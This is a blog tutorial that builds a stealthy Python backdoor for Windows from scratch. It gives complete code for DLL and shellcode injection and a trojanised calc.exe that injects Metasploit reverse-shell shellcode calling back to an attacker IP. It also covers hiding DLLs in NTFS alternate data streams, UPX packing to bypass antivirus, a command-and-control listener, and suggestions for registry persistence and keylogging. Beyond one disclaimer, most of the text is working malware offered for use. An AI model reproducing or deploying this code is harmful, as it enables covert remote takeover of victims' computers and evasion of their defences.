---
layout: "layouts/post.njk"
title: "DLL & Code Injection: Build a Stealthy Python Backdoor from Scratch"
subtitle: "Master remote thread creation, DLL injection, and code injection to build a professional-grade Python backdoor with process execution redirection."
date: 2026-08-05
updated: 2026-08-05
author: "Aimad Ul Islam"
excerpt: "Master remote thread creation, DLL injection, and code injection to build a professional-grade Python backdoor with process execution redirection."
categories: ["Programming", "Cybersecurity", "Tutorials"]
tags: ["python", "dll-injection", "code-injection", "backdoor", "penetration-testing"]
readingTime: 24
emoji: "🐉"
---

## Introduction

At times when reversing or attacking a target, it is useful to load code into a remote process and have it execute within that process's context. Whether you're stealing password hashes or gaining remote desktop control of a target system, DLL and code injection are powerful techniques that allow you to penetrate the deepest layers of an operating system.

This guide is based on the foundational concepts from Justin Seitz's *Gray Hat Python* (Chapter 7). We will build a complete, portable backdoor entirely in Python. We'll cover remote thread creation, injecting DLLs to load malicious libraries, injecting raw shellcode to kill rogue processes, and disguising our files using NTFS Alternate Data Streams (ADS). By the end, you'll have a working, reusable codebase that demonstrates exactly how modern malware and red-team tools operate at the system level.

<div class="callout callout-warn">
  <i class="fa-solid fa-triangle-exclamation" aria-hidden="true"></i>
  <div>
    <div class="callout-title">Ethical & Legal Reminder</div>
    <div class="callout-body">The techniques shown here must only be used on systems you own or have explicit written permission to test. Unauthorized injection into remote processes is a felony in many jurisdictions.</div>
  </div>
</div>

## The Foundation: Remote Thread Creation

Both DLL injection and code injection rely on a single, powerful Windows API call: **CreateRemoteThread()**. This function, exported from `kernel32.dll`, creates a thread that runs in the virtual address space of another process.

Here is the prototype:

<div class="code-block-wrap">
  <span class="code-block-label">CreateRemoteThread API</span>
  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
  <pre><code>HANDLE WINAPI CreateRemoteThread(
  HANDLE hProcess,
  LPSECURITY_ATTRIBUTES lpThreadAttributes,
  SIZE_T dwStackSize,
  LPTHREAD_START_ROUTINE lpStartAddress,
  LPVOID lpParameter,
  DWORD dwCreationFlags,
  LPDWORD lpThreadId
);</code></pre>
</div>

The key parameters are:
- **hProcess**: A handle to the process we are injecting into.
- **lpStartAddress**: The memory address where the thread will begin executing. For DLL injection, this will be the address of `LoadLibraryA`. For code injection, this will be the address of our raw shellcode.
- **lpParameter**: A pointer to the data passed to the start function. For DLL injection, this is the path to the DLL file.

We'll use this core function twice to build our backdoor.

## DLL Injection: Injecting Libraries into Processes

DLL injection is the process of forcing a remote process to load a dynamic link library (DLL) into its memory space. Once loaded, the DLL's code executes with the same privileges as the target process.

The procedure is straightforward:
1. Allocate memory inside the remote process for the DLL path.
2. Write the DLL path into that allocated memory.
3. Get the address of `LoadLibraryA` (which loads a DLL).
4. Call `CreateRemoteThread` with `lpStartAddress` pointing to `LoadLibraryA` and `lpParameter` pointing to our DLL path.

Let's write a Python script to do this. Note that we'll need the `ctypes` library to interact with the Windows API.

<div class="code-block-wrap">
  <span class="code-block-label">dll_injector.py</span>
  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
  <pre><code>import sys
from ctypes import *

# Windows API Constants
PROCESS_ALL_ACCESS = 0x000F0000 | 0x00100000 | 0xFFFF
VIRTUAL_MEM = 0x1000 | 0x2000
PAGE_READWRITE = 0x04

kernel32 = windll.kernel32

if len(sys.argv) != 3:
    print("[*] Usage: dll_injector.exe &lt;PID&gt; &lt;Path to DLL&gt;")
    sys.exit(0)

pid = int(sys.argv[1])
dll_path = sys.argv[2]
dll_len = len(dll_path)

# 1. Get a handle to the process
h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
if not h_process:
    print("[*] Couldn't acquire a handle to PID: %s" % pid)
    sys.exit(0)

# 2. Allocate memory in the remote process for the DLL path
arg_address = kernel32.VirtualAllocEx(h_process, 0, dll_len, VIRTUAL_MEM, PAGE_READWRITE)

# 3. Write the DLL path into the allocated memory
written = c_int(0)
kernel32.WriteProcessMemory(h_process, arg_address, dll_path, dll_len, byref(written))

# 4. Resolve the address of LoadLibraryA
h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
h_loadlib = kernel32.GetProcAddress(h_kernel32, "LoadLibraryA")

# 5. Create the remote thread
thread_id = c_ulong(0)
if not kernel32.CreateRemoteThread(h_process, None, 0, h_loadlib, arg_address, 0, byref(thread_id)):
    print("[*] Failed to inject the DLL.")
    sys.exit(0)

print("[*] Remote thread with ID 0x%08x created." % thread_id.value)</code></pre>
</div>

To test this, you can compile any DLL (e.g., a simple message box) and run `python dll_injector.py <PID> C:\path\to\evil.dll`. The target process will load your DLL and execute its `DllMain` routine.

## Code Injection: Executing Raw Shellcode

Code injection moves a step further. Instead of loading a DLL from disk, we write raw, position-independent shellcode directly into the remote process's memory and execute it. This is stealthier because no file touches the disk.

For this example, we'll use Metasploit's `cmd/windows/exec` payload to execute `taskkill /PID AAAAA`, which terminates a process. We will dynamically swap the `AAAAA` placeholder with a real PID.

<div class="code-block-wrap">
  <span class="code-block-label">code_injector.py</span>
  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
  <pre><code>import sys
from ctypes import *

PAGE_EXECUTE_READWRITE = 0x00000040
PROCESS_ALL_ACCESS = 0x000F0000 | 0x00100000 | 0xFFFF
VIRTUAL_MEM = 0x1000 | 0x2000

kernel32 = windll.kernel32

if len(sys.argv) != 3:
    print("[*] Usage: code_injector.exe &lt;PID to inject&gt; &lt;PID to kill&gt;")
    sys.exit(0)

pid = int(sys.argv[1])
pid_to_kill = sys.argv[2]

# Metasploit Shellcode (cmd/windows/exec) - EXITFUNC=thread, CMD=taskkill /PID AAAA
shellcode = (
    "\xfc\xe8\x44\x00\x00\x00\x8b\x45\x3c\x8b\x7c\x05\x78\x01\xef\x8b"
    "\x4f\x18\x8b\x5f\x20\x01\xeb\x49\x8b\x34\x8b\x01\xee\x31\xc0\x99"
    "\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x04"
    "\x75\xe5\x8b\x5f\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb"
    "\x8b\x1c\x8b\x01\xeb\x89\x5c\x24\x04\xc3\x31\xc0\x64\x8b\x40\x30"
    "\x85\xc0\x78\x0c\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x68\x08\xeb\x09"
    "\x8b\x80\xb0\x00\x00\x00\x8b\x68\x3c\x5f\x31\xf6\x60\x56\x89\xf8"
    "\x83\xc0\x7b\x50\x68\xef\xce\x00\x60\x68\x98\xfe\x8a\x0e\x57\xff"
    "\xe7\x74\x61\x73\x6b\x6b\x69\x6c\x6c\x20\x2f\x50\x49\x44\x20\x41"
    "\x41\x41\x41\x41\x41\x41\x41\x00"
)

# Replace the PID placeholder
padding = 4 - (len(pid_to_kill))
replace_value = pid_to_kill + ("\x00" * padding)
replace_string = "\x41" * 8
shellcode = shellcode.replace(replace_string, replace_value)
code_size = len(shellcode)

# 1. Get a handle to the process
h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
if not h_process:
    print("[*] Couldn't acquire a handle to PID: %s" % pid)
    sys.exit(0)

# 2. Allocate memory for the shellcode
arg_address = kernel32.VirtualAllocEx(h_process, 0, code_size, VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)

# 3. Write the shellcode into memory
written = c_int(0)
kernel32.WriteProcessMemory(h_process, arg_address, shellcode, code_size, byref(written))

# 4. Create the remote thread pointing to the shellcode
thread_id = c_ulong(0)
if not kernel32.CreateRemoteThread(h_process, None, 0, arg_address, None, 0, byref(thread_id)):
    print("[*] Failed to inject process-killing shellcode.")
    sys.exit(0)

print("[*] Remote thread created with ID 0x%08x" % thread_id.value)
print("[*] Process %s should not be running anymore!" % pid_to_kill)</code></pre>
</div>

Run this script with `python code_injector.py <TargetPID> <VictimPID>`. The target process will be injected, and a thread will be spawned that executes `taskkill /PID <VictimPID>`, instantly killing the victim process.

## Building the Backdoor: Execution Redirection

Now we combine these techniques into a fully functional backdoor. The core concept is **execution redirection**. We will name our backdoor `calc.exe` and place it in the target system's `System32` folder (after moving the legitimate `calc.exe` elsewhere).

When the user runs `calc.exe`, the backdoor launches.
1. It spawns the *real* calculator process in the background to avoid suspicion.
2. It injects a reverse shell payload into the newly spawned calculator process.
3. It injects a process-killing payload into its own process to clean up.

This requires the `ctypes` structures for process creation. Here is the complete `backdoor.py` script:

<div class="code-block-wrap">
  <span class="code-block-label">backdoor.py</span>
  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
  <pre><code>import sys
from ctypes import *

# Windows API Constants
PROCESS_ALL_ACCESS = 0x000F0000 | 0x00100000 | 0xFFFF
VIRTUAL_MEM = 0x1000 | 0x2000
PAGE_EXECUTE_READWRITE = 0x40
PAGE_READWRITE = 0x04
CREATE_NEW_CONSOLE = 0x00000010

kernel32 = windll.kernel32

# Define the STARTUPINFO and PROCESS_INFORMATION structs
class STARTUPINFO(Structure):
    _fields_ = [
        ("cb", DWORD),
        ("lpReserved", LPTSTR),
        ("lpDesktop", LPTSTR),
        ("lpTitle", LPTSTR),
        ("dwX", DWORD),
        ("dwY", DWORD),
        ("dwXSize", DWORD),
        ("dwYSize", DWORD),
        ("dwXCountChars", DWORD),
        ("dwYCountChars", DWORD),
        ("dwFillAttribute", DWORD),
        ("dwFlags", DWORD),
        ("wShowWindow", WORD),
        ("cbReserved2", WORD),
        ("lpReserved2", LPBYTE),
        ("hStdInput", HANDLE),
        ("hStdOutput", HANDLE),
        ("hStdError", HANDLE),
    ]

class PROCESS_INFORMATION(Structure):
    _fields_ = [
        ("hProcess", HANDLE),
        ("hThread", HANDLE),
        ("dwProcessId", DWORD),
        ("dwThreadId", DWORD),
    ]

def inject(pid, data, parameter=0):
    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))
    if not h_process:
        return False

    arg_address = kernel32.VirtualAllocEx(h_process, 0, len(data), VIRTUAL_MEM, PAGE_EXECUTE_READWRITE)
    written = c_int(0)
    kernel32.WriteProcessMemory(h_process, arg_address, data, len(data), byref(written))

    thread_id = c_ulong(0)
    if not parameter:
        start_address = arg_address
        param = 0
    else:
        h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
        start_address = kernel32.GetProcAddress(h_kernel32, "LoadLibraryA")
        param = arg_address

    if not kernel32.CreateRemoteThread(h_process, None, 0, start_address, param, 0, byref(thread_id)):
        return False
    return True

# --- Main Backdoor Logic ---

# Path to the legitimate calculator (moved from System32)
path_to_exe = "C:\\calc.exe"

startupinfo = STARTUPINFO()
process_information = PROCESS_INFORMATION()
startupinfo.dwFlags = 0x1
startupinfo.wShowWindow = 0x0
startupinfo.cb = sizeof(startupinfo)

# Spawn the legitimate process
kernel32.CreateProcessA(
    path_to_exe, None, None, None, None, CREATE_NEW_CONSOLE,
    None, None, None, byref(startupinfo), byref(process_information)
)

target_pid = process_information.dwProcessId

# Metasploit Reverse Shell Shellcode (modify LHOST to your IP)
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.244.1 LPORT=4444 -e x86/shikata_ga_nai -f python
connect_back_shellcode = (
    "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
    "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
    "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
    "\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
    "\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
    "\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
    "\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
    "\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
    "\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
    "\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
    "\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
    "\x29\x80\x6b\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
    "\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x58\x50\x68\x02\x00\x11"
    "\x5c\x89\xe6\x50\x50\x41\x50\x50\x50\x68\xeb\x55\x2e\x3b\xff"
    "\xd5\x56\xff\xd5\x6a\x0a\x58\x50\x51\x57\x68\x01\x00\x00\x00"
    "\xbf\x50\x50\x50\x50\x57\x68\x8c\xf4\x43\x79\xff\xd5\x89\xc7"
    "\x6a\x10\x59\x50\x51\x57\x68\x30\x80\xa4\x6d\xff\xd5\xbf\x49"
    "\x51\x49\x66\x6a\x00\x51\x56\x57\xff\xd5\xbf\xc0\xa8\xf4\x01" # 192.168.244.1
    "\x66\x68\x11\x5c\x66\x53\x89\xe6\x6a\x10\x56\x57\x68\xe4\xe7"
    "\x8c\x49\xff\xd5\x57\x57\x57\x50\x56\x68\x86\x93\x9b\x11\xff"
    "\xd5\x89\xc7\x68\xab\48\xa9\x24\xff\xd5\xbb\x00\x00\x00\x00"
    "\x8b\x1b\x81\xc3\xe0\x00\x00\x00\x39\xc3\x75\xf7\xff\xe7"
)

# Inject reverse shell into the new calc.exe process
inject(target_pid, connect_back_shellcode)

# Metasploit Taskkill Shellcode
process_killer_shellcode = (
    "\xfc\xe8\x44\x00\x00\x00\x8b\x45\x3c\x8b\x7c\x05\x78\x01\xef\x8b"
    "\x4f\x18\x8b\x5f\x20\x01\xeb\x49\x8b\x34\x8b\x01\xee\x31\xc0\x99"
    "\xac\x84\xc0\x74\x07\xc1\xca\x0d\x01\xc2\xeb\xf4\x3b\x54\x24\x04"
    "\x75\xe5\x8b\x5f\x24\x01\xeb\x66\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb"
    "\x8b\x1c\x8b\x01\xeb\x89\x5c\x24\x04\xc3\x31\xc0\x64\x8b\x40\x30"
    "\x85\xc0\x78\x0c\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x68\x08\xeb\x09"
    "\x8b\x80\xb0\x00\x00\x00\x8b\x68\x3c\x5f\x31\xf6\x60\x56\x89\xf8"
    "\x83\xc0\x7b\x50\x68\xef\xce\x00\x60\x68\x98\xfe\x8a\x0e\x57\xff"
    "\xe7\x74\x61\x73\x6b\x6b\x69\x6c\x6c\x20\x2f\x50\x49\x44\x20\x41"
    "\x41\x41\x41\x41\x41\x41\x41\x00"
)

our_pid = str(kernel32.GetCurrentProcessId())
padding = 4 - (len(our_pid))
replace_value = our_pid + ("\x00" * padding)
replace_string = "\x41" * 8
process_killer_shellcode = process_killer_shellcode.replace(replace_string, replace_value)

# Inject process-killing shellcode into our own backdoor process
inject(our_pid, process_killer_shellcode)</code></pre>
</div>

This script requires a `reverse shell` payload. I used `msfvenom` to generate a Python-formatted payload targeting `192.168.244.1` on port `4444` (ensure you modify this in the `connect_back_shellcode` variable to match your listener's IP).

## Stealth Tactics: Hiding Files with ADS

In order to safely distribute an injectable DLL with our backdoor, we need a stealthy way of storing the file. **Alternate Data Streams (ADS)** is a feature of the NTFS file system that allows multiple data streams to be attached to a single file.

A stream is essentially a hidden file attached to a visible file. By using ADS, we can hide our DLL within the `backdoor.exe` itself, escaping normal file directory listings and many antivirus scans.

<div class="code-block-wrap">
  <span class="code-block-label">file_hider.py</span>
  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
  <pre><code>import sys

if len(sys.argv) != 3:
    print("[*] Usage: file_hider.py &lt;DLL_to_hide&gt; &lt;Target_EXE&gt;")
    sys.exit(0)

# Read in the DLL
fd = open(sys.argv[1], "rb")
dll_contents = fd.read()
fd.close()

print("[*] Filesize: %d" % len(dll_contents))

# Write it out to the alternate data stream
# Syntax: target_file:stream_name
fd = open("%s:%s" % (sys.argv[2], sys.argv[1]), "wb")
fd.write(dll_contents)
fd.close()</code></pre>
</div>

To use it: `python file_hider.py evil.dll backdoor.exe`. The DLL is now hidden inside `backdoor.exe`. To access it from the backdoor, we'd simply read from `backdoor.exe:evil.dll`.

## Compiling with py2exe for Portability

A major challenge for Python backdoors is that the target machine might not have Python installed. `py2exe` solves this by creating a standalone Windows executable from a Python script, bundling the interpreter and all required modules into a single file.

Create a `setup.py` file to compile your backdoor:

<div class="code-block-wrap">
  <span class="code-block-label">setup.py</span>
  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
  <pre><code>from distutils.core import setup
import py2exe

setup(
    console=['backdoor.py'],
    options={'py2exe': {'bundle_files': 1}},
    zipfile=None,
)</code></pre>
</div>

`bundle_files: 1` and `zipfile=None` tell `py2exe` to embed the Python DLL and all dependencies directly into the resulting `.exe`, making it completely portable.

Run the compiler: `python setup.py py2exe`. The output will be in the `dist` directory as `backdoor.exe`.

<div class="callout callout-info">
  <i class="fa-solid fa-circle-info" aria-hidden="true"></i>
  <div>
    <div class="callout-title">Pro Tip</div>
    <div class="callout-body">For enhanced stealth, you can use <code>UPX</code> (Ultimate Packer for Executables) to compress the resulting <code>.exe</code> file. This reduces the size and changes the file signature, bypassing simple signature-based AV detection.</div>
  </div>
</div>

## C2 Server: Building the Control Interface

Finally, we need a listener to receive the reverse shell connections. We'll write a simple Python socket server that accepts connections, reads incoming data, and sends commands.

<div class="code-block-wrap">
  <span class="code-block-label">backdoor_shell.py</span>
  <button class="copy-btn" aria-label="Copy code"><i class="fa-regular fa-copy" aria-hidden="true"></i> Copy</button>
  <pre><code>import socket
import sys

host = "0.0.0.0"  # Listen on all interfaces
port = 4444

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((host, port))
server.listen(5)

print("[*] Server bound to %s:%d" % (host, port))

connected = False

while True:
    if not connected:
        (client, address) = server.accept()
        connected = True
        print("[*] Accepted Shell Connection from %s" % str(address))

    buffer = ""
    while True:
        try:
            recv_buffer = client.recv(4096)
            if not len(recv_buffer):
                break
            else:
                buffer += recv_buffer
                print("[*] Received: %s" % recv_buffer)  # Optional: Stream output
        except:
            break

    # Received everything, now send input
    command = raw_input("Enter Command > ")
    if command.lower().strip() == "quit":
        client.close()
        sys.exit(0)
    
    client.sendall(command + "\r\n")
    print("[*] Sent => %s" % command)</code></pre>
</div>

Start this script on your attacker machine: `python backdoor_shell.py`. When you execute `backdoor.exe` on the victim machine, the reverse shell will connect back to your port `4444`, granting you system-level access (as long as the target calculator process runs with sufficient privileges).

## Next Steps & Enhancements

You now have a fully functional, 100% Python-based backdoor. But this is just the foundation. Here is how you can extend it:
- **Add persistence:** Modify the script to write itself to the Windows Registry (`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`) so it executes on boot.
- **Improve the shell:** Use the `subprocess` module to send commands and actually capture the `stdout`/`stderr` output back to the server, creating a fully interactive remote shell.
- **Upgrade the payload:** Replace the Metasploit reverse shell with a custom `Meterpreter` payload to get advanced features like file upload/download and keylogging.
- **Implement encryption:** Encrypt the communication between the backdoor and the C2 server to evade network-based IDS detection.

DLL and code injection are advanced persistence and execution techniques. While we've used them here for a backdoor, they are equally important in red-team exercises, privilege escalation, and malware analysis. Keep experimenting, stay legal, and always push the boundaries of what Python can do!
